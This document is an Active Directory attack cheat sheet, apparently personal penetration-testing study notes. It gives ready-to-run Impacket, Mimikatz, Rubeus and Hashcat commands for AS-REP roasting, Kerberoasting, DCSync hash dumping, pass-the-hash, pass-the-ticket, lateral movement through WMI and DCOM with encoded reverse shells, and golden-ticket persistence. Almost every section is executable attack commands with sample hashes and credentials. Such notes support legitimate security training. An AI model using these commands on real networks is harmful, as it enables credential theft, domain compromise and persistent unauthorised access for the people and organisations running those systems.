# Active Directory

## Compromising Credentials

### AS-REP Roasting
If for some ridiculous reason the `Do not require Kerberos preauthentication` user setting is enabled, the door is open for querying for and receiving the users encrypted credentials, which we can then crack offline:
```bash
impacket-GetNPUsers -dc-ip 192.168.12.34  -request -outputfile hashes.asreproast our.domain/chumpasaurusUser
```
Then crack with Hashcat:
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
If we'd like to do the same thing but from Windows then:
```powershell
.\Rubeus.exe asreproast /nowrap
```
Copy the output to Kali and save it in a file called `hashes.asreproast`, and the command above will work just as well.

### Kerberoasting
For classic Kerberoasting from Windows:
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Same deal with copying the hashes back over to Kali:
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
For the same but from Kali:
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.12.34 our.domain/chumpasaurusUser
```

### Silver Tickets
If attempting to forge a silver ticket to hit a website, the following will work nicely from within Mimikatz:
```
mimikatz # kerberos::golden /sid:<current user SID> /domain:our.domain /ptt /target:target-site.our.domain /service:http /rc4:<NTLM hash of user whose privilege we want to assume> /user:chumpasaurusUser
```

### DC Sync
We can impersonate a Domain Controller and prompt others to perform a sync operation. This can allow us to retrieve the NTLM hash of any user. Via Mimikatz:
```
mimikatz # lsadump::dcsync /user:corp\Administrator
```
and via Linux:
```bash
impacket-secretsdump -just-dc-user Administrator corp.com/powerfulUser:"rubbishPassw0rd\!"@192.168.12.34
```

## Moving Laterally

### Powershell Creds Block
For both WinRM and WMI make use of the following to generate a `$credential` variable:
```powershell
$username = 'chump';
$password = 'chumpsDogsName123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```


### WinRM
Assuming you have credentials, the following will give us a Powershell session 
```powershell
New-PSSession -ComputerName 192.168.12.34 -Credential $credential
Enter-PSsession 1
```

### WMI
If for some reason we cannot use WinRM, or if we'd rather have a reverse shell from Kali, then worth trying WMI as an alternative:
```powershell
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.12.34 -Credential $credential -SessionOption $Options
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
The `$Command` variable used above that isn't explicitly defined anywhere should be a base64 encoded reverse shell written in Powershell as detailed in `notes/shells.md`

### PsExec
This will need to be imported onto the machine, but once there very convenient. Comes as part of the SysInternals suite.
```powershell
./PsExec64.exe -i  \\TARGE-MACHINE -u corp\chump -p chumpsPassword cmd
```

### Pass the Hash - SMB Shares
Assuming we have already laid our hands on an NTLM hash courtesy of `mimikatz`, the following command will give us access to an SMB Share with those credentials:
```bash
smbclient \\\\<IP address or computer name>\\<share name> -U <user name> --pw-nt-hash <user hash>
```
for example:
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

### Pass the Hash - Reverse Shell
We can authenticate to just about anything if the user whose hash we've obtained exists on the target machine, but as usual the holy grail is to just obtain a reverse shell:
```bash
impacket-psexec -hashes 00000000000000000000000000000000:<user hash> <user name>@<target IP>
```

### Pass the Hash - CMD Shell
Now with the Impacket suite:
```powershell
/usr/bin/impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.12.34
```

### Pass the Hash - Mimikatz
As if we needed another way of doing this, but here it is again with Mimikatz:
```
mimikatz # sekurlsa::pth /user:chump /domain:corp.com /ntlm:7a38310ea6f0027ee955abed1762964b /run:powershell
```

### Overpass the Hash
Instead of merely leveraging an NTLM hash to authenticate as a user, we could use it to obtain a Ticket Granting Ticket (TGT). This will allow us to make use of services that authenticate via Kerberos, and do not accept NTLM hashes. Namely the SysInternals PsExec.exe program.

First auth against a network share to make sure there is a TGT cached on the machine:
```powershell
net use \\machine07
```
Verify a TGT has been cached:
```powershell
klist
```
Now leverage to obtain a shell on a machine that we otherwise might not have been able to:
```powershell
.\PsExec.exe \\files04 cmd
```

### Pass the Ticket
Dump all TGT and TGSs present on the machine we have an admin presence on:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
Load the ticket we like the look of into our current session:
```
mimikatz # kerberos::ptt name-of-ticket-we-liked.kirbi
```
This should give our current session any privilege that that ticket grants that we didn't have already. Eg. the ability to view previously restricted files in a network fileshare.

### DCOM
To create a DCOM object:
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.12.34"))
```
To leverage it to execute commands:
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<our payload>","7")
```
For the payload section, once again we should make use of a base64 encoded Powershell reverse shell as detailed in `notes/shells.md`.


## Persistence

### Golden Ticket Forgery
If we have managed to own a domain controller, or a domain admin account, and we'd like to persist our access, then an ideal approach for us is to forge a so-called Golden Ticket.
```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:chump /domain:corp.com /sid:<chumps SID> /krbtgt:<krbtgt's NTLM hash> /ptt
mimikatz # misc::cmd
```
```powershell
PsExec.exe \\domainController cmd.exe
```
Nb. for the command above it is important to note that this is just Overpass The Hash on steroids, and that its important for us to leverage the hostname rather than the IP address. This is because if we use the hostname we leverage Kerberos as the auth mechanism, which we have just owned courtesy of our Golden Ticket. However if we use an IP then we fall back to NTLM auth, within which we have no special privilege.
